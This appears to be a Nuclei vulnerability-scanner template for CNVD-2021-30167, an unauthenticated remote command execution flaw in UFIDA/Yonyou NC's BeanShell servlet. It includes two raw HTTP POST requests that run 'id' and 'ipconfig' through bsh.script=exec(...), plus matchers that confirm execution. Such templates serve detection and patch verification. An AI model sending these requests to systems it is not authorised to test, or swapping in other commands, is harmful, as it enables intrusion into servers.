id: CNVD-2021-30167
info:
  name: UFIDA NC BeanShell Remote Command Execution
  author: pikpikcu
  severity: critical
  description: UFIDA NC BeanShell software is vulnerable to remote command execution
    due to a flaw in the bsh.servlet.BshServlet program, as described by vulnerability
    CNVD-2021-30167.
  reference:
  - https://mp.weixin.qq.com/s/FvqC1I_G14AEQNztU0zn8A
  - https://www.cnvd.org.cn/webinfo/show/6491
  - https://chowdera.com/2022/03/202203110138271510.html
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 10.0
    cwe-id: CWE-77
  tags: cnvd,cnvd2021,beanshell,rce,yonyou
  metadata:
    impact: The impact of the CNVD-2021-30167 vulnerability in UFIDA NC BeanShell
      could potentially allow remote attackers to execute arbitrary commands on the
      affected system, compromising confidentiality, integrity and availability of
      data.
    recommendation: I strongly recommend updating UFIDA NC BeanShell to the latest
      version to address the remote command execution vulnerability.
requests:
- raw:
  - 'POST /servlet/~ic/bsh.servlet.BshServlet HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    bsh.script=exec("id");

    '
  - 'POST /servlet/~ic/bsh.servlet.BshServlet HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    bsh.script=exec("ipconfig");

    '
  matchers-condition: and
  matchers:
  - type: regex
    regex:
    - uid=
    - Windows IP
    condition: or
  - type: word
    words:
    - BeanShell Test Servlet
  - type: status
    status:
    - 200
